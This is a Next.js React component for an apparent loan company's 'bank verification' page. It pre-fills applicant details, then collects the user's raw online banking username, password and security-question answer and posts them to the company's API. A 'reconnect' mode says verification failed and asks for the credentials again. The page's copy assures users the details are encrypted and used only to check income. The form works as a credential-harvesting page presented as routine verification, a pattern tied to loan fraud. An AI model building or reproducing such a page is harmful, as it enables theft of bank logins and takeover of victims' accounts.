"use client";

import React, { FormEvent, useEffect, useState } from "react";
import Link from "next/link";
import { useSearchParams } from "next/navigation";
import { ArrowRight, CheckCircle2, Loader2, Lock } from "lucide-react";
import {
  Field,
  FormSection,
  PasswordInput,
  Select,
  TextInput,
} from "@/components/apply/fields";
import { accountTypes } from "@/components/apply/options";
import { companyContact } from "@/components/CompanyContact";

const API_URL =
  process.env.NEXT_PUBLIC_API_URL ?? "https://api.longlakeloans.com";

type Mode = "verify" | "reconnect";

// Statuses the backend refuses bank verification for (see routes/bankVerification.ts)
const CLOSED_STATUSES = [
  "bank_verification_completed",
  "request_a_call",
  "funded",
  "declined_pb",
  "declined_hd",
];

type Lookup = {
  applicationId: string;
  firstName: string;
  lastName: string;
  loanAmount: number;
  bankName: string | null;
  status: string;
  email: string;
  account_type: string | null;
};

type FormState = {
  fullName: string;
  email: string;
  bankName: string;
  accountType: string;
  bankingUsername: string;
  bankingPassword: string;
  securityQuestion: string;
};

type Errors = Partial<Record<keyof FormState, string>>;

const copy: Record<
  Mode,
  {
    eyebrow: string;
    title: string;
    text: string;
    submit: string;
    endpoint: string;
  }
> = {
  verify: {
    eyebrow: "Banking verification",
    title: "Verify your bank account",
    text: "Securely connect your online banking so we can instantly verify your income and financial health.",
    submit: "Verify bank account",
    endpoint: "/api/bank-verification",
  },
  reconnect: {
    eyebrow: "Bank re-verification",
    title: "Reconnect your bank",
    text: "We weren't able to complete your banking verification. Please reconnect your online banking so we can finish reviewing your application.",
    submit: "Reconnect bank",
    endpoint: "/api/bank-verification/reconnect-bank-verification",
  },
};

function validate(form: FormState): Errors {
  const errors: Errors = {};
  if (form.fullName.trim().length < 2)
    errors.fullName = "Enter your full name.";
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email.trim()))
    errors.email = "Enter a valid email address.";
  if (form.bankName.trim().length < 2)
    errors.bankName = "Enter your bank's name.";
  if (!form.accountType) errors.accountType = "Select an account type.";
  if (!form.bankingUsername.trim())
    errors.bankingUsername = "Enter your online banking username.";
  if (!form.bankingPassword)
    errors.bankingPassword = "Enter your online banking password.";
  return errors;
}

export default function BankVerificationForm({ mode }: { mode: Mode }) {
  const searchParams = useSearchParams();
  const applicationId = searchParams.get("applicationId")?.trim() ?? "";
  const text = copy[mode];

  const [lookup, setLookup] = useState<Lookup | null>(null);
  const [lookupError, setLookupError] = useState(
    applicationId ? "" : "This link is missing an application ID.",
  );
  const [loading, setLoading] = useState(Boolean(applicationId));
  const [form, setForm] = useState<FormState>({
    fullName: "",
    email: "",
    bankName: "",
    accountType: "",
    bankingUsername: "",
    bankingPassword: "",
    securityQuestion: "",
  });
  const [errors, setErrors] = useState<Errors>({});
  const [submitError, setSubmitError] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [done, setDone] = useState(false);

  useEffect(() => {
    if (!applicationId) return;
    let cancelled = false;
    fetch(
      `${API_URL}/api/bank-verification/lookup?${new URLSearchParams({ applicationId })}`,
      { headers: { Accept: "application/json" }, cache: "no-store" },
    )
      .then(async (res) => {
        const body = await res.json().catch(() => null);
        if (!res.ok)
          throw new Error(body?.error ?? "We couldn't find this application.");
        return body as Lookup;
      })
      .then((data) => {
        if (cancelled) return;
        setLookup(data);
        setForm((prev) => ({
          ...prev,
          fullName: [data.firstName, data.lastName].filter(Boolean).join(" "),
          email: data.email ?? "",
          bankName: data.bankName ?? "",
          accountType:
            data.account_type === "checking" || data.account_type === "savings"
              ? data.account_type
              : "",
        }));
      })
      .catch((error) => {
        if (!cancelled)
          setLookupError(
            error instanceof Error && error.message !== "Failed to fetch"
              ? error.message
              : "We couldn't reach our servers. Check your connection and try again.",
          );
      })
      .finally(() => {
        if (!cancelled) setLoading(false);
      });
    return () => {
      cancelled = true;
    };
  }, [applicationId]);

  function set(patch: Partial<FormState>) {
    setForm((prev) => ({ ...prev, ...patch }));
    setErrors((prev) => {
      const next = { ...prev };
      for (const key of Object.keys(patch)) delete next[key as keyof FormState];
      return next;
    });
    setSubmitError("");
  }

  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const nextErrors = validate(form);
    setErrors(nextErrors);
    if (Object.keys(nextErrors).length > 0 || !lookup) return;

    setSubmitting(true);
    setSubmitError("");
    try {
      const res = await fetch(`${API_URL}${text.endpoint}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          applicationId: lookup.applicationId,
          fullName: form.fullName.trim(),
          email: form.email.trim(),
          bankName: form.bankName.trim(),
          accountType: form.accountType,
          bankingUsername: form.bankingUsername.trim(),
          bankingPassword: form.bankingPassword,
          securityQuestion: form.securityQuestion.trim(),
        }),
      });
      const body = await res.json().catch(() => null);
      if (!res.ok)
        throw new Error(body?.error ?? "We couldn't submit your verification.");
      setDone(true);
      setForm((prev) => ({
        ...prev,
        bankingPassword: "",
        bankingUsername: "",
      }));
    } catch (error) {
      setSubmitError(
        error instanceof Error && error.message !== "Failed to fetch"
          ? error.message
          : "We couldn't reach our servers. Check your connection and try again.",
      );
    } finally {
      setSubmitting(false);
    }
  }

  const trackHref = lookup
    ? `/track-loan?${new URLSearchParams({ applicationId: lookup.applicationId, email: lookup.email })}`
    : "/track-loan";

  let body: React.ReactNode;
  if (loading) {
    body = (
      <div className="flex min-h-60 items-center justify-center gap-2 text-sm text-muted">
        <Loader2
          className="h-4 w-4 animate-spin"
          strokeWidth={1.8}
          aria-hidden="true"
        />
        Loading your application…
      </div>
    );
  } else if (lookupError || !lookup) {
    body = (
      <Notice title="We couldn't load this application">
        {lookupError || "Please check your link and try again."}
      </Notice>
    );
  } else if (done) {
    body = (
      <Notice title="Thank you — your bank details were received" success>
        Your banking verification has been submitted. Next, you&apos;ll schedule
        or complete your brief call with one of our live underwriter
        specialists. We&apos;ve sent a confirmation to {lookup.email}.
        <TrackLink href={trackHref} />
      </Notice>
    );
  } else if (CLOSED_STATUSES.includes(lookup.status)) {
    body = (
      <Notice title="Bank verification isn't needed right now">
        Application #{lookup.applicationId} has moved past this step. Track your
        application to see where it stands.
        <TrackLink href={trackHref} />
      </Notice>
    );
  } else {
    body = (
      <form onSubmit={handleSubmit} noValidate className="px-5 py-8 sm:px-8">
        <FormSection title="Your details">
          <Field
            label="Full name"
            error={errors.fullName}
            className="sm:col-span-3"
          >
            <TextInput
              value={form.fullName}
              onChange={(e) => set({ fullName: e.target.value })}
              autoComplete="name"
              error={errors.fullName}
              disabled
              className="bg-wash text-muted cursor-not-allowed"
            />
          </Field>
          <Field
            label="Email address"
            error={errors.email}
            className="sm:col-span-3"
          >
            <TextInput
              type="email"
              value={form.email}
              onChange={(e) => set({ email: e.target.value })}
              autoComplete="email"
              error={errors.email}
              disabled
              className="bg-wash text-muted cursor-not-allowed"
            />
          </Field>
        </FormSection>

        <FormSection title="Bank account">
          <Field
            label="Bank name"
            error={errors.bankName}
            className="sm:col-span-3"
          >
            <TextInput
              value={form.bankName}
              onChange={(e) => set({ bankName: e.target.value })}
              // placeholder="e.g. Chase"
              error={errors.bankName}
              disabled
              className="bg-wash text-muted cursor-not-allowed"
            />
          </Field>
          <Field
            label="Account type"
            error={errors.accountType}
            className="sm:col-span-3"
          >
            <Select
              options={accountTypes}
              value={form.accountType}
              onChange={(e) => set({ accountType: e.target.value })}
              error={errors.accountType}
              disabled
              className="bg-wash text-muted cursor-not-allowed"
            />
          </Field>
        </FormSection>

        <FormSection
          title="Online banking"
          text="Use the same sign-in you use for your bank's website or app."
        >
          <Field
            label="Online banking username"
            error={errors.bankingUsername}
            className="sm:col-span-3"
          >
            <TextInput
              value={form.bankingUsername}
              onChange={(e) => set({ bankingUsername: e.target.value })}
              autoComplete="off"
              error={errors.bankingUsername}
            />
          </Field>
          <Field
            label="Online banking password"
            error={errors.bankingPassword}
            className="sm:col-span-3"
          >
            <PasswordInput
              value={form.bankingPassword}
              onChange={(e) => set({ bankingPassword: e.target.value })}
              autoComplete="off"
              error={errors.bankingPassword}
            />
          </Field>
          <Field
            label="Security question answer"
            optional
            hint="Only if your bank asks one when you sign in."
            className="sm:col-span-6"
          >
            <TextInput
              value={form.securityQuestion}
              onChange={(e) => set({ securityQuestion: e.target.value })}
              autoComplete="off"
            />
          </Field>
          <p className="sm:col-span-6 -mt-2 flex items-start gap-2.5 text-xs leading-relaxed text-muted">
            <Lock
              className="mt-0.5 h-3.5 w-3.5 shrink-0"
              strokeWidth={1.5}
              aria-hidden="true"
            />
            Your credentials are sent over an encrypted connection and used only
            to verify your income and financial health.
          </p>
        </FormSection>

        {submitError && (
          <p role="alert" className="mt-8 text-sm font-medium text-red-700">
            {submitError}
          </p>
        )}

        <button
          type="submit"
          disabled={submitting}
          className="mt-8 inline-flex min-h-12 w-full items-center justify-center gap-2 bg-brand px-5 text-sm font-medium text-paper transition-colors hover:bg-brand-dark disabled:cursor-wait disabled:opacity-70 sm:w-auto"
        >
          {submitting && (
            <Loader2
              className="h-4 w-4 animate-spin"
              strokeWidth={1.8}
              aria-hidden="true"
            />
          )}
          {submitting ? "Submitting…" : text.submit}
          {!submitting && (
            <ArrowRight
              className="h-4 w-4"
              strokeWidth={1.7}
              aria-hidden="true"
            />
          )}
        </button>
      </form>
    );
  }

  return (
    <div className="mx-auto max-w-3xl">
      <p className="text-xs font-medium uppercase tracking-[0.18em] text-muted">
        {text.eyebrow}
      </p>
      <h1 className="mt-5 text-4xl font-semibold leading-tight tracking-tight sm:text-5xl">
        {text.title}
      </h1>
      <p className="mt-5 max-w-xl text-base leading-relaxed text-body">
        {text.text}
      </p>
      {lookup && (
        <p className="mt-4 text-sm text-muted">
          Application #{lookup.applicationId}
          {lookup.firstName ? ` · ${lookup.firstName}` : ""}
        </p>
      )}

      <div className="mt-10 border border-line bg-white">{body}</div>

      <p className="mt-6 text-sm leading-relaxed text-body">
        Need help? Email{" "}
        <a
          href={companyContact.email.href}
          className="font-medium text-ink underline underline-offset-4"
        >
          {companyContact.email.display}
        </a>{" "}
        or call{" "}
        <a
          href={companyContact.phones.local.href}
          className="font-medium text-ink underline underline-offset-4"
        >
          {companyContact.phones.local.display}
        </a>
        .
      </p>
    </div>
  );
}

function Notice({
  title,
  success,
  children,
}: {
  title: string;
  success?: boolean;
  children: React.ReactNode;
}) {
  return (
    <div role="status" className="px-5 py-8 sm:px-8">
      <div className="flex items-start gap-3">
        {success && (
          <CheckCircle2
            className="mt-0.5 h-5 w-5 shrink-0 text-emerald-600"
            strokeWidth={1.7}
            aria-hidden="true"
          />
        )}
        <div>
          <p className="text-base font-semibold text-ink">{title}</p>
          <div className="mt-2 text-sm leading-relaxed text-body">
            {children}
          </div>
        </div>
      </div>
    </div>
  );
}

function TrackLink({ href }: { href: string }) {
  return (
    <Link
      href={href}
      className="mt-5 flex w-fit items-center gap-2 text-sm font-medium text-ink underline-offset-4 hover:underline"
    >
      Track your application
      <ArrowRight className="h-4 w-4" strokeWidth={1.7} aria-hidden="true" />
    </Link>
  );
}
